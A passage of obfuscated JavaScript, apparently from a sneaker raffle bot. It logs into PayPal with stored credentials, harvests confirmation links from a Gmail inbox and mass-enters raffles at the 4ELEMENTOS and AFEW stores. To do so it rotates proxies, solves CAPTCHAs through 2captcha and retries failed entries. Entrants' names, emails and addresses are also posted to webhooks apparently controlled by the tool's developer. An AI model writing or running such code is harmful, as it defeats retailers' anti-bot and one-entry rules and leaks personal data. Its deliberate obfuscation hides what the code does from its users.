        return _0x3b04e9['Password'] = _0x3a7cd7['Password'], _0x144018['appendFileSync']('../accounts/paypal.csv', '\x0a' + _0x3b04e9['Email'] + ',' + _0x3b04e9['Password'] + ',' + _0x3b04e9['Proxy']), _0x3b04e9;
    }
    let _0x5cff45 = await _0xe0dac0();
    var _0x34a40a = [];
    console['clear'](), console['log']('How\x20many\x20links\x20would\x20you\x20like\x20to\x20verify\x20on\x20this\x20paypal?');
    let _0x48816a = await _0x30e3d7['get']('Amount'), _0x36cdd0 = _0x48816a['Amount'];
    async function _0x3be40f() {
        let _0x22371e = 0x0;
        var _0x272f16 = new _0x2b7859({
            'user': _0x4a0109['masterMail'],
            'password': _0x4a0109['masterPassword'],
            'host': 'imap.gmail.com',
            'port': 0x3e1,
            'tls': !![],
            'autotls': 'always'
        });
        function _0x1b2bce(_0x3cfb9d) {
            _0x272f16['openBox']('INBOX', ![], _0x3cfb9d);
        }
        _0x272f16['once']('ready', function () {
            _0x1b2bce(function (_0x3bd16d, _0xc7bab0) {
                console['clear'](), console['log']('Looking\x20For\x20Links');
                if (_0x3bd16d)
                    throw _0x3bd16d;
                _0x272f16['seq']['search']([
                    'UNSEEN',
                    [
                        'SUBJECT',
                        'PayPal'
                    ]
                ], function (_0x3e97f5, _0x313d10) {
                    if (!_0x313d10 || !_0x313d10['length'])
                        console['log'](_0x2fd7e7() + '\x20[' + _0x29aa09 + ']\x20No\x20mails\x20found'), _0x272f16['end']();
                    else {
                        _0x313d10 = _0x313d10['slice'](0x0, _0x36cdd0);
                        var _0x299840 = _0x272f16['seq']['fetch'](_0x313d10, {
                            'bodies': '',
                            'markSeen': !![]
                        });
                        _0x299840['on']('message', function (_0x5bcedf, _0xa7d282) {
                            var _0x3350be = '(#' + _0xa7d282 + ')\x20';
                            _0x5bcedf['on']('body', function (_0x3437d9, _0xf86cb) {
                                _0x186dbf(_0x3437d9, (_0x4bae87, _0x1b63fa) => {
                                    if (_0x1b63fa['subject'] == 'PayPal\x20Konto\x20bestätigen' || _0x1b63fa['subject'] == 'Confirm\x20your\x20PayPal\x20account') {
                                        mes = _0x1b63fa['text']['split']('[')[0x2];
                                        var _0x519dd2 = mes['split'](']')[0x0];
                                        _0x34a40a['push'](_0x519dd2);
                                    }
                                });
                            }), _0x5bcedf['once']('end', function () {
                                _0x22371e++;
                            });
                        }), _0x299840['once']('error', function (_0x483d2b) {
                            console['log']('Fetch\x20error:\x20' + _0x483d2b);
                        }), _0x299840['once']('end', function () {
                            _0x272f16['end']();
                        });
                    }
                });
            });
        }), _0x272f16['once']('error', function (_0x424e42) {
            console['log'](_0xe8dd24['red'](_0x424e42['message'])), console['log']('Read\x20the\x20guide\x20on\x20how\x20to\x20setup\x20your\x20mailbox');
        }), _0x272f16['once']('end', async function () {
        }), _0x272f16['connect']();
    }
    try {
        _0x3be40f(), await _0x41ff52(0xfa0), console['log']('Found\x20' + _0x34a40a['length'] + '\x20Links\x20in\x20Mailbox');
    } catch {
        console['log']('Searching\x20mailbox\x20failed,\x20please\x20read\x20the\x20guide\x20on\x20how\x20to\x20setup..'), await _0x41ff52(0xfa0);
    }
    var _0x41ad69;
    _0x3a603f('' + _0x29aa09);
    var _0x32e204 = _0x5cff45['Proxy']['split'](':'), _0x4b340b;
    try {
        _0x4b340b = await _0x3ad8ba['launch']({
            'userDataDir': 'sessions/' + _0x5cff45['Email'],
            'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
            'headless': ![],
            'args': [
                '--proxy-server=' + _0x32e204[0x0] + ':' + _0x32e204[0x1],
                '--no-sandbox',
                '--disable-setuid-sandbox'
            ]
        });
    } catch {
        _0x4b340b = await _0x3ad8ba['launch']({
            'userDataDir': 'sessions/' + _0x5cff45['Email'],
            'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
            'headless': ![],
            'args': [
                '--proxy-server=' + _0x32e204[0x0] + ':' + _0x32e204[0x1],
                '--no-sandbox',
                '--disable-setuid-sandbox'
            ]
        });
    }
    try {
        console['log'](_0x2fd7e7() + '\x20[' + _0x29aa09 + ']\x20Getting\x20Session');
        const _0x4d8d49 = await _0x4b340b['newPage']();
        await _0x4d8d49['authenticate']({
            'username': '' + _0x32e204[0x2],
            'password': '' + _0x32e204[0x3]
        }), await _0x4d8d49['setViewport']({
            'width': 0x230,
            'height': 0x2d0
        }), await _0x4d8d49['goto']('https://www.paypal.com/signin');
        try {
            console['log'](_0x2fd7e7() + '\x20[' + _0x29aa09 + ']\x20Logging\x20in\x20to\x20your\x20Paypal\x20account..'), await _0x4d8d49['waitForSelector']('#email');
            let _0x2ff318 = await _0x4d8d49['$eval']('#email', _0x26f5b3 => _0x26f5b3['getAttribute']('value'));
            if (_0x2ff318 == '') {
                await _0x4d8d49['type']('#email', _0x5cff45['Email']), await _0x41ff52(0x1d3);
                let _0x1dea4b = await _0x4d8d49['$']('#splitPassword');
                _0x1dea4b && (await _0x4d8d49['click']('#btnNext'), await _0x41ff52(0xa28)), await _0x4d8d49['type']('#password', _0x5cff45['Password']), await _0x41ff52(0x35c), await _0x4d8d49['click']('#btnLogin');
            } else
                await _0x4d8d49['type']('#password', _0x5cff45['Password']), await _0x41ff52(0x35c), await _0x4d8d49['click']('#btnLogin');
            await _0x4d8d49['waitForSelector']('#reactContainer__balance', { 'timeout': 0x493e0 }), console['log'](_0x2fd7e7() + '\x20[' + _0x29aa09 + ']\x20Successfully\x20logged\x20in'), await _0x41ff52(0x2710);
        } catch (_0x580a64) {
            throw new Error('Login\x20session\x20expired\x20' + _0x580a64);
        }
        for (var _0x4651bf = 0x0; _0x4651bf < _0x34a40a['length']; _0x4651bf++) {
            console['log'](_0x2fd7e7() + '\x20[' + _0x29aa09 + ']\x20Task\x20' + (_0x4651bf + 0x1) + '\x20:\x20Starting\x20Verification'), _0x3a603f(_0x29aa09 + '\x20Task\x20' + (_0x4651bf + 0x1) + '\x20/\x20' + _0x34a40a['length']);
            const _0x4be9e3 = await _0x4b340b['newPage']();
            await _0x4be9e3['goto']('' + _0x34a40a[_0x4651bf], { 'waitUntil': 'networkidle2' }), await _0x41ff52(0xbb8);
            try {
                const _0x2cb38f = await _0x4be9e3['$']('#challenge-heading');
                _0x2cb38f && (console['log'](_0x2fd7e7() + '\x20[' + _0x29aa09 + ']\x20Task\x20' + (_0x4651bf + 0x1) + '\x20:\x20' + _0xe8dd24['yellow']('2FA\x20Required')), await _0x4be9e3['waitForSelector']('.CheckoutButton_buttonWrapper_2VloF', { 'timeout': 0x493e0 }));
                await _0x41ff52(0x9c40), await _0x4be9e3['waitForSelector']('#payment-submit-btn'), await _0x4be9e3['$eval']('#payment-submit-btn', _0x424c38 => _0x424c38['click']()), await _0x4be9e3['click']('#payment-submit-btn');
                try {
                    await _0x4be9e3['waitForSelector']('img[alt=\x22AFEW\x20STORE\x22]'), await _0x41ff52(0x5dc), console['log'](_0xe8dd24['green'](_0x2fd7e7() + '\x20[' + _0x29aa09 + ']\x20Task\x20' + (_0x4651bf + 0x1) + '\x20:\x20Link\x20Verified'));
                } catch (_0x104828) {
                    _0x57ac78 = 'yes';
                    throw new Error('Payment\x20Rejected:\x20' + _0x104828['message']);
                } finally {
                    if (_0x57ac78 == 'yes' && _0xbd1f66 != 0x2) {
                        console['log'](_0xe8dd24['red'](_0x2fd7e7() + '\x20[' + _0x29aa09['name'] + ']\x20Task\x20' + (_0x4651bf + 0x1) + '\x20:\x20Retrying\x20(' + _0xbd1f66 + '\x20/\x205)')), _0x4651bf = _0x4651bf - 0x1, _0xbd1f66 = _0xbd1f66 + 0x1;
                        continue;
                    }
                    _0x57ac78 == 'yes' && _0xbd1f66 >= 0x2 && (_0x53e25e(csv[_0x4651bf], _0x29aa09), _0x57ac78 = 'no', _0xbd1f66 = 0x0), await _0x4be9e3['close'](), await _0x41ff52(0x4650);
                }
            } catch (_0x27eb32) {
                console['log'](_0xe8dd24['red'](_0x2fd7e7() + '\x20[' + _0x29aa09 + ']\x20Task\x20' + (_0x4651bf + 0x1) + '\x20:\x20' + _0x27eb32));
            }
        }
    } catch (_0x3df0bb) {
        console['log'](_0xe8dd24['red']('' + _0x3df0bb));
    } finally {
        await _0x4b340b['close']();
    }
}
const _0x6f29e = [
    {
        'name': '4ELEMENTOS',
        'modules': [
            {
                'name': '4ELEMENTOS\x20Raffle\x20Entries',
                'store': '4ELEMENTOS',
                'logo': 'https://cdn.lovesavingsgroup.com/logos/4elementos.jpg',
                'function': async function (_0x48684d, _0x2189f4, _0x2a1a25) {
                    _0x3ad8ba['use'](_0x36d6c8()), _0x3ad8ba['use'](_0x541303({
                        'provider': {
                            'id': '2captcha',
                            'token': '' + _0x4a0109['captchaKey']
                        },
                        'visualFeedback': !![]
                    }));
                    for (var _0x1f777f = 0x0; _0x1f777f < _0x2189f4['length']; _0x1f777f++) {
                        if (_0x36e30c != 'yes')
                            var _0x36e30c = '', _0x4c4d9e = 0x0;
                        var _0x3e343a;
                        try {
                            await _0x547a29(_0x2189f4, _0x1f777f);
                        } catch {
                            _0x36e30c = 'no';
                            throw new Error('Invalid\x20CSV\x20Format,\x20use\x20the\x20CSV\x20Files\x20from\x20the\x20guides!');
                        }
                        _0x3a603f(_0x48684d['name'] + '\x20Task\x20' + (_0x1f777f + 0x1) + '\x20/\x20' + _0x2189f4['length'] + '\x20||\x20File:\x20' + _0x140e27 + '\x20Proxies:\x20' + _0x6deda4);
                        var _0x204fa2 = [
                            '40',
                            '40,5',
                            '41',
                            '42',
                            '42,5',
                            '43',
                            '44',
                            '45',
                            '45,5',
                            '46',
                            '47',
                            '47,5',
                            '48'
                        ], _0x3e0913 = Math['round'](Math['random']() * (_0x204fa2['length'] - 0x1));
                        _0x2189f4[_0x1f777f]['Size'] == 'RANDOM' && (_0x2189f4[_0x1f777f]['Size'] = _0x204fa2[_0x3e0913]);
                        var _0x568f34 = Math['round'](Math['random']() * (_0x2a1a25['length'] - 0x1)), _0x50e306 = _0x2a1a25[_0x568f34]['split'](':'), _0x37d7e3;
                        try {
                            _0x37d7e3 = await _0x3ad8ba['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !![],
                                'args': [
                                    '--proxy-server=' + _0x50e306[0x0] + ':' + _0x50e306[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        } catch {
                            _0x37d7e3 = await _0x3ad8ba['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !![],
                                'args': [
                                    '--proxy-server=' + _0x50e306[0x0] + ':' + _0x50e306[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        }
                        try {
                            console['log'](_0x2fd7e7() + '\x20[' + _0x48684d['name'] + ']\x20Task\x20' + (_0x1f777f + 0x1) + '\x20:\x20Getting\x20Session');
                            const _0x414440 = await _0x37d7e3['newPage']();
                            await _0x414440['authenticate']({
                                'username': '' + _0x50e306[0x2],
                                'password': '' + _0x50e306[0x3]
                            }), await _0x414440['setRequestInterception'](!![]), _0x414440['on']('request', _0x1d37a4 => {
                                _0x1d37a4['resourceType']() === 'image' || _0x1d37a4['resourceType']() === 'font' || _0x1d37a4['resourceType']() === 'media' ? _0x1d37a4['abort']() : _0x1d37a4['continue']();
                            }), await _0x414440['goto'](_0x2189f4[_0x1f777f]['Url'], { 'waitUntil': 'networkidle2' }), console['log'](_0x2fd7e7() + '\x20[' + _0x48684d['name'] + ']\x20Task\x20' + (_0x1f777f + 0x1) + '\x20:\x20Starting\x20Entry'), await _0x414440['waitForSelector']('#accept-all-gdpr'), await _0x414440['click']('#accept-all-gdpr'), await _0x414440['waitForSelector']('#raffles-product'), await _0x41ff52(0x3e8), await _0x414440['$eval']('#raffles-product', _0xbb97ca => _0xbb97ca['click']()), await _0x41ff52(0x1388), await _0x414440['waitForSelector']('.fancybox-inner\x20>\x20iframe');
                            var _0x1ca0a4 = await _0x414440['$']('.fancybox-inner\x20>\x20iframe'), _0x1fb393 = await _0x1ca0a4['contentFrame']();
                            console['log'](_0x2fd7e7() + '\x20[' + _0x48684d['name'] + ']\x20Task\x20' + (_0x1f777f + 0x1) + '\x20:\x20Checking\x20Information'), await _0x1fb393['waitForSelector']('input[name=\x22sm-form-email\x22]'), await _0x41ff52(0x1f4), await _0x1fb393['type']('input[name=\x22sm-form-email\x22]', _0x2189f4[_0x1f777f]['Email']), await _0x41ff52(0xc8), await _0x1fb393['type']('input[name=\x22sm-form-name\x22]', _0x2189f4[_0x1f777f]['FirstName'] + '\x20' + _0x2189f4[_0x1f777f]['LastName']), await _0x41ff52(0xc8), await _0x1fb393['type']('input[name=\x22sm-form-street\x22]', _0x2189f4[_0x1f777f]['Address1'] + '\x20' + _0x2189f4[_0x1f777f]['HouseNumber'] + '\x20' + _0x2189f4[_0x1f777f]['Address2']), await _0x41ff52(0xc8), await _0x1fb393['type']('input[name=\x22sm-form-city\x22]', _0x2189f4[_0x1f777f]['City']), await _0x41ff52(0xc8), await _0x1fb393['type']('input[name=\x22sm-form-province\x22]', _0x2189f4[_0x1f777f]['State']), await _0x41ff52(0xc8), await _0x1fb393['type']('input[name=\x22sm-form-zip\x22]', _0x2189f4[_0x1f777f]['Zip']), await _0x41ff52(0xc8), await _0x1fb393['type']('input[name=\x22sm-form-country\x22]', _0x2189f4[_0x1f777f]['Country']), await _0x41ff52(0xc8), await _0x1fb393['type']('input[name=\x22sm-form-phone\x22]', _0x2189f4[_0x1f777f]['Phone']), await _0x41ff52(0xc8), await _0x1fb393['type']('input[name=\x22sm-cst.instagram_user\x22]', _0x2189f4[_0x1f777f]['Follower']), await _0x41ff52(0xc8), await _0x1fb393['type']('input[name=\x22sm-cst.size\x22]', _0x2189f4[_0x1f777f]['Size']), await _0x41ff52(0x1f4), await _0x1fb393['click']('.icheckbox_simple-custom.icheckbox--CONSENT'), await _0x41ff52(0x1f4), await _0x1fb393['click']('.icheckbox_simple-custom'), await _0x41ff52(0x1f4), console['log'](_0x2fd7e7() + '\x20[' + _0x48684d['name'] + ']\x20Task\x20' + (_0x1f777f + 0x1) + '\x20:\x20Sending\x20Request'), await _0x1fb393['$eval']('form', _0x2d76c7 => _0x2d76c7['submit']()), console['log'](_0xe8dd24['green'](_0x2fd7e7() + '\x20[' + _0x48684d['name'] + ']\x20Task\x20' + (_0x1f777f + 0x1) + '\x20:\x20Raffle\x20Entered!')), _0x36e30c = '';
                            var _0x5c497e = await _0x17c0a2(_0x2189f4[_0x1f777f], _0x48684d, 'dev', ![]), _0x342e72 = await _0x17c0a2(_0x2189f4[_0x1f777f], _0x48684d, 'pub', ![]);
                            const _0xd5e8c6 = {
                                'succesDEVMSG': { 'embeds': [_0x5c497e] },
                                'succesPUBMSG': { 'embeds': [_0x342e72] }
                            };
                            try {
                                _0x4a0109['webhook'] != undefined && _0x4a0109['webhook'] != '' && await _0x161ab9(_0x4a0109['webhook'], _0xd5e8c6['succesDEVMSG']), await _0x41ff52(0xc8), await _0x161ab9(_0x6ed44c, _0xd5e8c6['succesDEVMSG']), await _0x41ff52(0xc8), await _0x161ab9(_0x17a127, _0xd5e8c6['succesPUBMSG']);
                            } catch (_0x4eb2ae) {
                                console['log'](_0xe8dd24['yellow'](_0x2fd7e7() + '\x20[' + _0x48684d['name'] + ']\x20Task\x20' + (_0x1f777f + 0x1) + '\x20:\x20Error\x20sending\x20webhook\x20' + _0x4eb2ae));
                            }
                        } catch (_0x31a981) {
                            console['log'](_0xe8dd24['red'](_0x2fd7e7() + '\x20[' + _0x48684d['name'] + ']\x20Task\x20' + (_0x1f777f + 0x1) + '\x20:\x20' + _0x31a981)), _0x3e343a = '' + _0x31a981;
                            var _0x22c7a1 = await _0x17c0a2(_0x2189f4[_0x1f777f], _0x48684d, 'dev', !![], _0x3e343a), _0x5c497e = await _0x17c0a2(_0x2189f4[_0x1f777f], _0x48684d, 'dev', ![]), _0x342e72 = await _0x17c0a2(_0x2189f4[_0x1f777f], _0x48684d, 'pub', ![]);
                            const _0x29ea5a = {
                                'succesDEVMSG': { 'embeds': [_0x5c497e] },
                                'succesPUBMSG': { 'embeds': [_0x342e72] }
                            };
                            _0x29ea5a['errorDEV'] = { 'embeds': [_0x22c7a1] }, _0x4a0109['webhook'] != undefined && _0x4a0109['webhook'] != '' && await _0x161ab9(_0x4a0109['webhook'], _0x29ea5a['errorDEV']), await _0x161ab9(_0x11ee4c, _0x29ea5a['errorDEV']), _0x31a981 != 'Error\x20sending\x20entry.\x20Check\x20if\x20duplicate,\x20or\x20proxies.' && (_0x36e30c = 'yes');
                        } finally {
                            _0x37d7e3['close']();
                            if (_0x36e30c == 'yes' && _0x4c4d9e != 0x5 && _0x3e343a != 'Size\x20Not\x20Found') {
                                console['log'](_0xe8dd24['red'](_0x2fd7e7() + '\x20[' + _0x48684d['name'] + ']\x20Task\x20' + (_0x1f777f + 0x1) + '\x20:\x20Retrying\x20(' + _0x4c4d9e + '\x20/\x205)\x20')), _0x1f777f = _0x1f777f - 0x1, _0x4c4d9e = _0x4c4d9e + 0x1;
                                continue;
                            }
                            _0x36e30c == 'yes' && _0x4c4d9e >= 0x5 && (_0x53e25e(_0x2189f4[_0x1f777f], _0x48684d), _0x36e30c = 'no', _0x4c4d9e = 0x0), console['log'](_0x2fd7e7() + '\x20[' + _0x48684d['name'] + ']\x20Waiting\x20for\x20' + _0x4a0109['delay'] + '\x20ms'), await _0x41ff52(_0x4a0109['delay']);
                        }
                    }
                }
            },
            {
                'name': '4ELEMENTOS\x20Link\x20Verification',
                'store': '4ELEMENTOS',
                'logo': 'https://cdn.lovesavingsgroup.com/logos/4elementos.jpg',
                'function': async function (_0x4404e0, _0x3e6c4e) {
                    var _0x130ffa = [];
                    async function _0x3edf74() {
                        var _0x1f9aea = new _0x2b7859({
                            'user': _0x4a0109['masterMail'],
                            'password': _0x4a0109['masterPassword'],
                            'host': 'imap.gmail.com',
                            'port': 0x3e1,
                            'tls': !![],
                            'autotls': 'always'
                        });
                        function _0x23e9b0(_0x24772a) {
                            _0x1f9aea['openBox']('INBOX', ![], _0x24772a);
                        }
                        _0x1f9aea['once']('ready', function () {
                            _0x23e9b0(function (_0x2268ea, _0x41cce7) {
                                console['clear'](), console['log']('Looking\x20For\x20Links');
                                if (_0x2268ea)
                                    throw _0x2268ea;
                                _0x1f9aea['seq']['search'](['UNSEEN'], function (_0xcbe822, _0x4be576) {
                                    if (!_0x4be576 || !_0x4be576['length'])
                                        console['log'](_0x2fd7e7() + '\x20[' + _0x4404e0['name'] + ']\x20No\x20mails\x20found'), _0x1f9aea['end']();
                                    else {
                                        var _0x4f693d = _0x1f9aea['seq']['fetch'](_0x4be576, {
                                            'bodies': '',
                                            'markSeen': !![]
                                        });
                                        _0x4f693d['on']('message', function (_0x428bf3, _0xa2ad4c) {
                                            var _0x38dc18 = '(#' + _0xa2ad4c + ')\x20';
                                            _0x428bf3['on']('body', function (_0x5f080c, _0x19dea5) {
                                                _0x186dbf(_0x5f080c, (_0x142fb3, _0x20b957) => {
                                                    if (_0x20b957['subject'] == 'Confirm\x20your\x20subscription\x20to\x20the\x20Raffle\x20||\x20Confirma\x20tu\x20suscripción\x20al\x20Raffle') {
                                                        var _0x3edcb9 = _0x20b957['html']['split']('\x0a');
                                                        for (var _0x5ce93a = 0x0; _0x5ce93a < _0x3edcb9['length']; _0x5ce93a++) {
                                                            if (_0x3edcb9[_0x5ce93a]['includes']('salesmanago') && _0x3edcb9[_0x5ce93a]['includes']('<td') && _0x3edcb9[_0x5ce93a]['includes']('href')) {
                                                                var _0x1e2229 = _0x3edcb9[_0x5ce93a]['split']('href=\x22'), _0x488ed7 = _0x1e2229[0x1]['split']('\x22')[0x0];
                                                                _0x130ffa['push'](_0x488ed7);
                                                                break;
                                                            }
                                                        }
                                                    }
                                                });
                                            }), _0x428bf3['once']('end', function () {
                                            });
                                        }), _0x4f693d['once']('error', function (_0x5bc1e8) {
                                            console['log']('Fetch\x20error:\x20' + _0x5bc1e8);
                                        }), _0x4f693d['once']('end', function () {
                                            _0x1f9aea['end']();
                                        });
                                    }
                                });
                            });
                        }), _0x1f9aea['once']('error', function (_0x574a03) {
                            console['log'](_0xe8dd24['red'](_0x574a03['message'])), console['log']('Read\x20the\x20guide\x20on\x20how\x20to\x20setup\x20your\x20mailbox');
                        }), _0x1f9aea['once']('end', async function () {
                        }), _0x1f9aea['connect']();
                    }
                    async function _0x5478c4(_0x2d862d, _0x4757a0, _0x51ee4e) {
                        for (var _0x41d8e1 = 0x0; _0x41d8e1 < _0x4757a0['length']; _0x41d8e1++) {
                            async function _0x516800(_0xe26be7, _0xc00141, _0x1614c6, _0x4ca21f, _0x55d0ee) {
                                var _0x44a867, _0x4b3ae1 = {}, _0x581c2d = [], _0x12d4e8 = {}, _0xcd9234 = [
                                    '40',
                                    '40,5',
                                    '41',
                                    '42',
                                    '42,5',
                                    '43',
                                    '44',
                                    '45',
                                    '45,5',
                                    '46',
                                    '47',
                                    '47,5',
                                    '48'
                                ], _0x4fe0f1 = Math['round'](Math['random']() * (_0xcd9234['length'] - 0x1));
                                _0x4ca21f[_0xe26be7]['Size'] == 'RANDOM' && (_0x4ca21f[_0xe26be7]['Size'] = _0xcd9234[_0x4fe0f1]);
                                !_0x4ca21f && (_0x4ca21f = {});
                                if (_0x4a0109['useRandomProxy'] = ![])
                                    var _0x2a217e = _0x55d0ee[_0xe26be7]['split'](':');
                                else
                                    var _0x4abd0d = Math['round'](Math['random']() * (_0x55d0ee['length'] - 0x1)), _0x2a217e = _0x55d0ee[_0x4abd0d]['split'](':');
                                var _0x203893 = {
                                    'jar': _0x500704,
                                    'followAllRedirects': !![],
                                    'method': 'POST',
                                    'url': _0x1614c6['url'],
                                    'headers': _0x1614c6['headers'],
                                    'body': JSON['stringify'](_0x4b3ae1),
                                    'proxy': 'http://' + _0x2a217e[0x2] + ':' + _0x2a217e[0x3] + '@' + _0x2a217e[0x0] + ':' + _0x2a217e[0x1]
                                };
                                return _0xc00141 != 'ver' && (_0x203893['url'] = _0x1614c6['url'], _0x203893['headers'] = _0x1614c6['headers']), _0xc00141 == 'ver' && (_0x203893['method'] = 'GET', _0x203893['url'] = _0x4ca21f[_0xe26be7]), new Promise(function (_0x52a596, _0x39d801) {
                                    callback = async (_0x56c3d0, _0x186401, _0x56e96b) => {
                                        if (!_0x56c3d0 && _0x186401['statusCode'] == 0xca || !_0x56c3d0 && _0x186401['statusCode'] == 0xc8) {
                                            if (_0xc00141 != 'ver') {
                                                var _0xbf99f4 = await _0x17c0a2(_0x4ca21f[_0xe26be7], _0x1614c6, 'dev', ![]), _0x11dd17 = await _0x17c0a2(_0x4ca21f[_0xe26be7], _0x1614c6, 'pub', ![]);
                                                const _0xf674d2 = {
                                                    'succesDEVMSG': { 'embeds': [_0xbf99f4] },
                                                    'succesPUBMSG': { 'embeds': [_0x11dd17] }
                                                };
                                                if (_0x4a0109['webhook'] != undefined && _0x4a0109['webhook'] != '')
                                                    try {
                                                        await _0x161ab9(_0x4a0109['webhook'], _0xf674d2['succesDEVMSG']);
                                                    } catch {
                                                    }
                                                await _0x41ff52(0xc8), await _0x161ab9(_0x6ed44c, _0xf674d2['succesDEVMSG']), await _0x41ff52(0xc8);
                                                try {
                                                    await _0x161ab9(_0x17a127, _0xf674d2['succesPUBMSG']);
                                                } catch {
                                                }
                                                _0xe72aef(_0x4ca21f[_0xe26be7], _0x1614c6);
                                            }
                                            _0x52a596(console['log'](_0xe8dd24['green'](_0x2fd7e7() + '\x20[' + _0x1614c6['name'] + ']\x20Task\x20' + (_0xe26be7 + 0x1) + ':\x20Raffle\x20Entered!')));
                                        } else {
                                            if (_0xc00141 != 'ver') {
                                                var _0x165fde = '' + _0x56c3d0, _0x1e75a4 = await _0x17c0a2(_0x4ca21f[_0xe26be7], _0x1614c6, 'dev', !![], _0x165fde), _0x1e5483 = {};
                                                _0x1e5483['errorDEV'] = { 'embeds': [_0x1e75a4] }, _0x53e25e(_0x4ca21f[_0xe26be7], _0x1614c6), _0x4a0109['webhook'] != undefined && _0x4a0109['webhook'] != '' && await _0x161ab9(_0x4a0109['webhook'], _0x1e5483['errorDEV']), await _0x161ab9(_0x11ee4c, _0x1e5483['errorDEV']);
                                            }
                                            _0x39d801(console['log'](_0xe8dd24['red'](_0x2fd7e7() + '\x20[' + _0x1614c6['name'] + ']\x20Task\x20' + (_0xe26be7 + 0x1) + ':\x20' + _0x56c3d0)));
                                        }
                                    };
                                    try {
                                        _0xc00141 != 'ver' ? console['log'](_0x2fd7e7() + '\x20[' + _0x1614c6['name'] + ']\x20Task\x20' + (_0xe26be7 + 0x1) + ':\x20Sending\x20Entry\x20for\x20' + _0x4b3ae1['data']['attributes']['email']) : console['log'](_0x2fd7e7() + '\x20[' + _0x1614c6['name'] + ']\x20Task\x20' + (_0xe26be7 + 0x1) + ':\x20Fetching\x20Response'), _0x11f0d1(_0x203893, callback);
                                    } catch (_0x41709d) {
                                        console['log'](_0x2fd7e7() + '\x20Task\x20' + (_0xe26be7 + 0x1) + ':\x20' + _0x41709d);
                                    }
                                });
                            }
                            ;
                            try {
                                await _0x516800(_0x41d8e1, 'ver', _0x2d862d, _0x4757a0, _0x51ee4e), console['log'](_0x2fd7e7() + '\x20[' + _0x2d862d['name'] + ']\x20Sleeping\x20for\x20' + _0x4a0109['delay'] + '\x20ms'), await _0x41ff52(_0x4a0109['delay']);
                            } catch (_0x5d7a62) {
                            }
                        }
                    }
                    try {
                        _0x3edf74(), await _0x41ff52(0xfa0), console['log']('Found\x20' + _0x130ffa['length'] + '\x20Links\x20in\x20Mailbox');
                    } catch {
                        console['log']('Searching\x20mailbox\x20failed,\x20please\x20read\x20the\x20guide\x20on\x20how\x20to\x20setup..');
                    }
                    await _0x5478c4(_0x4404e0, _0x130ffa, _0x3e6c4e);
                }
            }
        ]
    },
    {
        'name': 'AFEW\x20Store',
        'modules': [{
            'name': 'AFEW\x20Raffle\x20Entries',
            'store': 'AFEW',
            'logo': 'https://d19kzigy6tpscu.cloudfront.net/media/CACHE/images/logo_thumbnail/afew_logo_100x100_1647428869.png',
            'function': async function (_0x5c7a1b, _0x36e4c8, _0x31b156) {
                for (var _0x5bc20e = 0x0; _0x5bc20e < _0x36e4c8['length']; _0x5bc20e++) {
                    _0x4a0109['AfewDelay'] = _0x4a0109['delay'];
                    var _0x48ff20;
                    if (_0x8d52b3 != 'yes')
                        var _0x8d52b3 = '', _0x81cc94 = 0x0;
                    var _0x17f91b = _0x36e4c8[_0x5bc20e]['Url'], _0x95ae84 = _0x36e4c8[_0x5bc20e];
                    _0x3a603f(_0x5c7a1b['name'] + '\x20Task\x20' + (_0x5bc20e + 0x1) + '\x20/\x20' + _0x36e4c8['length'] + '\x20||\x20File:\x20' + _0x140e27 + '\x20Proxies:\x20' + _0x6deda4);
                    try {
                        await _0x547a29(_0x36e4c8, _0x5bc20e);
                    } catch {
                        _0x8d52b3 = 'no';
                        throw new Error('Invalid\x20CSV\x20Format,\x20use\x20the\x20CSV\x20Files\x20from\x20the\x20guides!');
                    }
                    async function _0x25e21b(_0x33ae82) {
                        const _0x42b90f = _0x144018['readFileSync']('../successful-tasks.csv', 'utf8'), _0x4caf6d = _0x4cc58a['parse'](_0x42b90f, { 'header': !![] })['data'];
                        let _0x2c9d41 = ![];
                        for (var _0x418b67 of _0x4caf6d) {
                            if (_0x418b67['Url'] == _0x33ae82['Url'] && _0x418b67['Email'] == _0x33ae82['Email']) {
                                _0x2c9d41 = !![];
                                break;
                            }
                        }
                        return _0x2c9d41;
                    }
                    if (await _0x25e21b(_0x36e4c8[_0x5bc20e]) == !![]) {
                        console['log'](_0x2fd7e7() + '\x20[' + _0x5c7a1b['name'] + ']\x20Task\x20' + (_0x5bc20e + 0x1) + '\x20:\x20Task\x20Already\x20Entered,\x20Going\x20to\x20Next\x20Task');
                        continue;
                    }
                    var _0x319a93 = await _0x17c0a2(_0x36e4c8[_0x5bc20e], _0x5c7a1b, 'dev', ![]), _0x554033 = await _0x17c0a2(_0x36e4c8[_0x5bc20e], _0x5c7a1b, 'pub', ![]);
                    const _0x3cfca3 = {
                        'succesDEVMSG': { 'embeds': [_0x319a93] },
                        'succesPUBMSG': { 'embeds': [_0x554033] }
                    };
                    if (_0x36e4c8[_0x5bc20e]['Email'] == '' || _0x36e4c8[_0x5bc20e]['FirstName'] == '' || _0x36e4c8[_0x5bc20e]['LastName'] == '' || _0x36e4c8[_0x5bc20e]['Country'] == '' || _0x36e4c8[_0x5bc20e]['Size'] == '' || _0x36e4c8[_0x5bc20e]['Address1'] == '' || _0x36e4c8[_0x5bc20e]['Zip'] == '') {
                        console['log'](_0x2fd7e7() + '\x20[' + _0x5c7a1b['name'] + ']\x20Task\x20' + (_0x5bc20e + 0x1) + '\x20:\x20Invalid\x20CSV');
                        continue;
                    }
                    if (_0x4a0109['useRandomProxy'] = ![])
                        var _0x750b15 = _0x31b156[_0x5bc20e]['split'](':');
                    else
                        var _0x4c23f3 = Math['round'](Math['random']() * (_0x31b156['length'] - 0x1)), _0x750b15 = _0x31b156[_0x4c23f3]['split'](':');
                    var _0x48a10a;
                    try {
                        _0x48a10a = await _0x3ad8ba['launch']({
                            'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                            'headless': !![],
                            'args': [
                                '--proxy-server=' + _0x750b15[0x0] + ':' + _0x750b15[0x1],
                                '--no-sandbox',
